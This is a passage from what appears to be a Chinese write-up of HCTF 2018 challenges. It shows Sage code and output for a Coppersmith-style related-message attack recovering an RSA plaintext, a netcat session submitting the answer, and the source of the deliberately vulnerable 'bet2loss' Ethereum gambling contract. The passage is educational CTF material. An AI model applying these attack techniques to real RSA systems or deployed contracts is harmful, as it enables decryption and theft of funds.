class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))                                                                                                                                           </span><br><span class="line">e=<span class="number">5</span>                                                                                                                                                                              </span><br><span class="line">g1 = x**e - c1                                                                                                                                                                   </span><br><span class="line">g2 = (x + y)**e - c2                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">q1 = g1.change_ring(PRZZ)                                                                                                                                                        </span><br><span class="line">q2 = g2.change_ring(PRZZ)                 </span><br><span class="line"> </span><br><span class="line">h = q2.resultant(q1)</span><br><span class="line"><span class="comment"># need to switch to univariate polynomial ring</span></span><br><span class="line"><span class="comment"># because .small_roots is implemented only for univariate</span></span><br><span class="line">h = h.univariate_polynomial() <span class="comment"># x is hopefully eliminated</span></span><br><span class="line">h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">h = h.monic()</span><br><span class="line"> </span><br><span class="line">roots = h.small_roots(X=<span class="number">2</span>**<span class="number">40</span>, beta=<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">assert</span> roots, <span class="string">"Failed1"</span></span><br><span class="line"><span class="keyword">print</span> roots</span><br><span class="line">diff = roots[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> diff &gt; <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">^Idiff = -diff</span><br><span class="line">^Ic1, c2 = c2, c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Difference:"</span>, diff</span><br><span class="line"></span><br><span class="line">x = PRx.gen() <span class="comment"># otherwise write xn</span></span><br><span class="line">g1 = x**e - c1</span><br><span class="line">g2 = (x + diff)**e - c2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gcd</span></span><br><span class="line"><span class="keyword">while</span> g2:</span><br><span class="line">    g1, g2 = g2, g1 % g2</span><br><span class="line"> </span><br><span class="line">g = g1.monic()</span><br><span class="line"><span class="keyword">assert</span> g.degree() == <span class="number">1</span>, <span class="string">"Failed 2"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># g = xn - msg</span></span><br><span class="line">msg = -g[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># convert to str</span></span><br><span class="line">h = int(msg)</span><br><span class="line"><span class="keyword">print</span> h</span><br><span class="line"><span class="keyword">print</span> h+diff+int(n)</span><br><span class="line"><span class="keyword">print</span> pow(h,e,n)==c2</span><br><span class="line"><span class="keyword">print</span> pow(h+diff+int(n),e,n)==c1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[555991320628]</span><br><span class="line">Difference: 30290716620841793899146321994568496023252750053596786876611475641947678118979038294637697826463401155985354968691924997404322605452761001870059955726773324447235980051453346857315677224128047844328773148916021249443603911449637550383591704762386567005058018282308230728051353460058754497672179057700421161074247576457866689070241760427131473043482158810401561313321107974516682297500997022575554884396342862329278222526955343597739332964020816251046425193373642417717381045917123341522209552123269466378004786062763182259628931179308017861705958534248179294164338076634721107705015038219232572426688683766371284897691</span><br><span class="line">2932093288739759017131922832119390508643918321984410853</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2583475209918998219801122954379479992650705870599189051232760719646159719619265755438890096354620462669930665081971091894103757999670741311927625969755788747121762969679475351111489399600154562955287885202707223159968667071096275208629651189581238338521064833101272863069918738346837635731886529517213961300297787649206078555692261069713014027837983048971538947661147625228754443387901174007943169362738696168181450776372832045356985606263519804479231156806800627979267259445511274742157175638821617100281049528076791498180668899828383550671492688471895766846725</span><br><span class="line">29320932887397590171319228321193905086439183219844108532583475209918998219801122954379479992650705870599189051232760719646159719619265755438890096354620462669930665081971091894103757999670741311927625969755788747121762969679475351111489399600154562955287885202707223159968667071096275208629651189581238338521064833101272863069918738346837635731886529517213961300297787649206078555692261069713014027837983048971538947661147625228754443387901174007943169362738696168181450776372832045356985606263519804479231156806800627979267259445511274742157175638821617100281049528076791498180668899828383550671492688471339775526097</span><br><span class="line">True</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">m1&gt;n</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nc rsa.2018.hctf.io 10086</span><br><span class="line">Welcome to flag getting system</span><br><span class="line">give me your token &gt; uvm73jg2AFMECo71DIZRZh39MRqFOI2w</span><br><span class="line">n=25592302757401106056280234286012383062484235707312989164780308492200872167178574218000602787441725428426717090949654793218739897595107846312672513664085694001801608518590887961938014572669134367079646488310507850336050513025245626467377203241863607999325036917193601505657352182776079774009206570703186219337621551483393737290768330888410101854796481874297267599196619674335794044792069495519108109223425797503203570902994567568592084357934714964501535669657986930473369655871619588840794482884419083552554342422741496026024222914198234788143213719654823547100803532256499706071071498660891381652493208839656686738591</span><br><span class="line">c1=11690907386363649212644384569199890345770981654517160939164832907826289543551982063610220071961849700921425395140710365953159185666787437146246103625442409812945763501692710328379204747353203817255953902210586779053720571365060460732531241991577093405485858643711950523138375131702989487907339644510108399052427817874710822165262868315224968612849619299795358325603907678116650332797927084567328392462191457872943785013598632574175405870522070537466045471567735827773482872427192699293399500104479883708854100100037846415639145150417103704144637686300025634446944846253236091651808972028854707078113064878063321580768</span><br><span class="line">c2=23770070496907514366297412141037667449588865437018376514390695607679676986001301621556277980415958296151188882273930436528902856816100291709779231712294522684117809069750177322126984516684260974647430093063414228366055366719654277299019192226831695082426012957631732846185788410351093879858771697093954122318192675776953344922612983099660105822719741335067051112337020739320099859836973578421498466368851839142137257484447051174094093504567507429730727091330591571603022555924970273436929750572410470501844270943580821467782713936322388728653073754746083727342190374906283014672336536995144296014243057684586151967259</span><br><span class="line">now give me you answer</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214510724634343988</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214511375412065022</span><br><span class="line">hctf&#123;1a105ae83a735e0b914f4715aae936b67f297aa424dc10c119ca257ae7f6e508&#125;</span><br></pre></td></tr></table></figure><p>当difference很大时， <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[650777721034]</span><br><span class="line">Difference: 25592302757401106056280234286012383062484235707312989164780308492200872167178574218000602787441725428426717090949654793218739897595107846312672513664085694001801608518590887961938014572669134367079646488310507850336050513025245626467377203241863607999325036917193601505657352182776079774009206570703186219337621551483393737290768330888410101854796481874297267599196619674335794044792069495519108109223425797503203570902994567568592084357934714964501535669657986930473369655871619588840794482884419083552554342422741496026024222914198234788143213719654823547100803532256499706071071498660891381652493208839005909017557</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214511375412065022</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214510724634343988</span><br><span class="line">True</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p><p><code>m2 =  h m1 =   h+diff+int(n)</code></p><p>搞定 &gt; <code>flag:hctf{1a105ae83a735e0b914f4715aae936b67f297aa424dc10c119ca257ae7f6e508}</code></p><h1><span id="blockchain">blockchain</span></h1><h2><span id="bet2loss">bet2loss</span></h2><p>描述  0x006b9bc418e43e92cf8d380c56b8d4be41fda319 for ropsten and open source  D2GBToken is onsale. Now New game is coming. We’ll give everyone 1000 D2GBTOKEN for playing. only God of Gamblers can get flag. URL http://bet2loss.2018.hctf.io 合约部署在ropsten测试网络，地址为0x006b9bc418e43e92cf8d380c56b8d4be41fda319，而且是开源的。</p><p>访问网站 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Bet2Loss Game!</span><br><span class="line">only winner can get flag!</span><br><span class="line">1、Bet2Loss Game is based on Ropsten. open source on xxx.</span><br><span class="line">2、Every New gamer will airdrop 1000 B2GB for betting.</span><br><span class="line">3、Game Rule: Set a modulo (2 - 40), guess a number (0-(modulo-1)), and set a betnumber (1 - balanceOf(you) and less than 100000). If you win, you will get betnumber*modulo B2GB.</span><br><span class="line">4、Example: set 2 as modulo, guess 1, and bet 100 B2GB. if 1 == random_number%modulo, you will get 100*2, which is 200 B2GB.</span><br><span class="line">5、Ahhhh, if balanceOf(you) &gt; 10000000, you can use the function PayForFlag. Admin will post the flag to your email.</span><br><span class="line"></span><br><span class="line">ps: you need install a eth wallet, just like metamask in chrome webstore and a little test eth for gasprice.</span><br><span class="line">ps: you can get the test eth from every ether faucet.(just like https://faucet.metamask.io/)</span><br></pre></td></tr></table></figure></p><p>这个页面里面可以下注，进行游戏（ps: 一看参数就知道是参考dice2win这个游戏） 每个新玩家空投1000 B2GB。目标<code>balanceOf(you) &gt; 10000000</code>，然后调用<code>PayForFlag</code>。</p><p>接下来就是找漏洞点了。</p><p>直接去区块链浏览器中看智能合约源码。（顺带吐槽下，为啥区块链的题目部署到同一个测试网络中，这样不是直接可以看别的队伍的payload么）。 <a href="https://ropsten.etherscan.io/address/0x006b9bc418e43e92cf8d380c56b8d4be41fda319%23code" target="_blank" rel="noopener">https://ropsten.etherscan.io/address/0x006b9bc418e43e92cf8d380c56b8d4be41fda319%23code</a> 源码如下 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"><span class="comment">// Wow. Welcome to hctf2018</span></span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">mul</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">div</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &gt; <span class="number">0</span>); </span><br><span class="line">    uint256 c = a / b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">sub</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">add</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20&#123;</span><br><span class="line">  <span class="keyword">using</span> SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint256) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> _totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address owner)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address _to, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">      balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class="line">      balances[_to] = balances[_to].add(_value);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B2GBToken is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant name = <span class="string">"test"</span>;</span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant symbol = <span class="string">"test"</span>;</span><br><span class="line">  uint8 <span class="keyword">public</span> constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint256 <span class="keyword">public</span> constant _airdropAmount = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> constant INITIAL_SUPPLY = <span class="number">20000000000</span> * (<span class="number">10</span> ** uint256(decimals));</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; <span class="keyword">bool</span>) initialized;</span><br><span class="line"></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">    initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">    _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    balances[msg.sender] = INITIAL_SUPPLY;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// airdrop</span></span><br><span class="line">  <span class="function">function <span class="title">AirdropCheck</span><span class="params">()</span> internal <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!initialized[msg.sender]) &#123;</span><br><span class="line">            initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">            balances[msg.sender] = _airdropAmount;</span><br><span class="line">            _totalSupply += _airdropAmount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bet2Loss is B2GBToken&#123;</span><br><span class="line">    uint constant MIN_JACKPOT_BET = <span class="number">0.1</span> ether;</span><br><span class="line">    uint constant MIN_BET = <span class="number">1</span>;</span><br><span class="line">    uint constant MAX_BET = <span class="number">100000</span>;</span><br><span class="line">    uint constant MAX_MODULO = <span class="number">100</span>;</span><br><span class="line">    uint constant BET_EXPIRATION_BLOCKS = <span class="number">250</span>;</span><br><span class="line">    address constant DUMMY_ADDRESS = <span class="number">0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C</span>;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    address <span class="keyword">private</span> nextOwner;</span><br><span class="line">    uint <span class="keyword">public</span> maxProfit;</span><br><span class="line">    address <span class="keyword">public</span> secretSigner;</span><br><span class="line">    uint128 <span class="keyword">public</span> jackpotSize;</span><br><span class="line">    uint128 <span class="keyword">public</span> lockedInBets;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Bet</span> &#123;</span></span><br><span class="line">        uint betnumber;</span><br><span class="line">        uint8 modulo;</span><br><span class="line">        uint40 placeBlockNumber;</span><br><span class="line">        uint40 mask;</span><br><span class="line">        address gambler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; Bet) bets;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">FailedPayment</span><span class="params">(address indexed beneficiary, uint amount)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">Payment</span><span class="params">(address indexed beneficiary, uint amount)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">Commit</span><span class="params">(uint commit)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">GetFlag</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="built_in">string</span> b64email,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="built_in">string</span> back</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line">    constructor () <span class="keyword">public</span> &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        secretSigner = DUMMY_ADDRESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require (msg.sender == owner, <span class="string">"OnlyOwner methods called by non-owner."</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setSecretSigner</span><span class="params">(address newSecretSigner)</span> external onlyOwner </span>&#123;</span><br><span class="line">        secretSigner = newSecretSigner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">placeBet</span><span class="params">(uint betMask, uint modulo, uint betnumber, uint commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v)</span> external payable </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// airdrop</span></span><br><span class="line">        AirdropCheck();</span><br><span class="line"></span><br><span class="line">        Bet storage bet = bets[commit];</span><br><span class="line">        require (bet.gambler == address(<span class="number">0</span>), <span class="string">"Bet should be in a 'clean' state."</span>);</span><br><span class="line">        require (balances[msg.sender] &gt;= betnumber, <span class="string">"no more balances"</span>);</span><br><span class="line">        require (modulo &gt; <span class="number">1</span> &amp;&amp; modulo &lt;= MAX_MODULO, <span class="string">"Modulo should be within range."</span>);</span><br><span class="line">        require (betMask &gt;= <span class="number">0</span> &amp;&amp; betMask &lt; modulo, <span class="string">"Mask should be within range."</span>);</span><br><span class="line">        require (betnumber &gt; <span class="number">0</span> &amp;&amp; betnumber &lt; <span class="number">1000</span>, <span class="string">"BetNumber should be within range."</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        require (block.number &lt;= commitLastBlock, <span class="string">"Commit has expired."</span>);</span><br><span class="line">        bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));</span><br><span class="line">        require (secretSigner == ecrecover(signatureHash, v, r, s), <span class="string">"ECDSA signature is not valid."</span>);</span><br><span class="line"></span><br><span class="line">        uint possibleWinAmount;</span><br><span class="line"></span><br><span class="line">        possibleWinAmount = getDiceWinAmount(betnumber, modulo);</span><br><span class="line">        lockedInBets += uint128(possibleWinAmount);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// require (lockedInBets &lt;= balances[owner], "Cannot afford to lose this bet.");</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = balances[msg.sender].sub(betnumber);</span><br><span class="line">        <span class="function">emit <span class="title">Commit</span><span class="params">(commit)</span></span>;</span><br><span class="line"></span><br><span class="line">        bet.betnumber = betnumber;</span><br><span class="line">        bet.modulo = uint8(modulo);</span><br><span class="line">        bet.placeBlockNumber = uint40(block.number);</span><br><span class="line">        bet.mask = uint40(betMask);</span><br><span class="line">        bet.gambler = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">settleBet</span><span class="params">(uint reveal)</span> external </span>&#123;</span><br><span class="line">        AirdropCheck();</span><br><span class="line"></span><br><span class="line">        uint commit = uint(keccak256(abi.encodePacked(reveal)));</span><br><span class="line"></span><br><span class="line">        Bet storage bet = bets[commit];</span><br><span class="line">        uint placeBlockNumber = bet.placeBlockNumber;</span><br><span class="line"></span><br><span class="line">        require (block.number &gt; placeBlockNumber, <span class="string">"settleBet in the same block as placeBet, or before."</span>);</span><br><span class="line">        require (block.number &lt;= placeBlockNumber + BET_EXPIRATION_BLOCKS, <span class="string">"Blockhash can't be queried by EVM."</span>);</span><br><span class="line"></span><br><span class="line">        settleBetCommon(bet, reveal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">settleBetCommon</span><span class="params">(Bet storage bet, uint reveal)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint betnumber = bet.betnumber;</span><br><span class="line">        uint mask = bet.mask;</span><br><span class="line">        uint modulo = bet.modulo;</span><br><span class="line">        uint placeBlockNumber = bet.placeBlockNumber;</span><br><span class="line">        address gambler = bet.gambler;</span><br><span class="line"></span><br><span class="line">        require (betnumber != <span class="number">0</span>, <span class="string">"Bet should be in an 'active' state"</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 entropy = keccak256(abi.encodePacked(reveal, placeBlockNumber));</span><br><span class="line">        uint dice = uint(entropy) % modulo;</span><br><span class="line"></span><br><span class="line">        uint diceWinAmount;</span><br><span class="line">        diceWinAmount = getDiceWinAmount(betnumber, modulo);</span><br><span class="line"></span><br><span class="line">        uint diceWin = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dice == mask)&#123;</span><br><span class="line">          diceWin = diceWinAmount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lockedInBets -= uint128(diceWinAmount);</span><br><span class="line"></span><br><span class="line">        sendFunds(gambler, diceWin == <span class="number">0</span> ? <span class="number">1</span> wei : diceWin , diceWin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">getDiceWinAmount</span><span class="params">(uint amount, uint modulo)</span> <span class="keyword">private</span> pure <span class="title">returns</span> <span class="params">(uint winAmount)</span> </span>&#123;</span><br><span class="line">      winAmount = amount * modulo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">sendFunds</span><span class="params">(address beneficiary, uint amount, uint successLogAmount)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">      transfer(beneficiary, amount);</span><br><span class="line">      <span class="function">emit <span class="title">Payment</span><span class="params">(beneficiary, successLogAmount)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//flag</span></span><br><span class="line">    <span class="function">function <span class="title">PayForFlag</span><span class="params">(<span class="built_in">string</span> b64email)</span> <span class="keyword">public</span> payable <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">      require (balances[msg.sender] &gt; <span class="number">10000000</span>);</span><br><span class="line">      <span class="function">emit <span class="title">GetFlag</span><span class="params">(b64email, <span class="string">"Get flag!"</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span 